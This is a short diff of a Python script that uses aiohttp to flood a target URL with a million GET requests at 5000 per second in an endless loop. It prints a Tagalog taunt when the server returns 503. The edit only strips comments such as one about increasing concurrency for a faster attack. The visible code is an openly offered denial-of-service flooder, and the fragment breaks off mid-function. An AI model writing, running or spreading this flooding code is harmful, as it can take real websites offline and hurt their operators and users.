@@ -25,12 +25,12 @@ print("""
 password_module = importlib.import_module('password')
 
 total_requests = 1000000
-requests_per_second = 5000  # Increase concurrency for faster attack
+requests_per_second = 5000 
 
 async def attack(target_url):
     try:
         async with aiohttp.ClientSession() as session:
-            while True:  # Continuous loop
+            while True:
                 async with session.get(target_url) as response:
                     if response.status == 503:
                         print("BOOM BAGSAK ANG GAGO HAHAHA 🤣🤣")
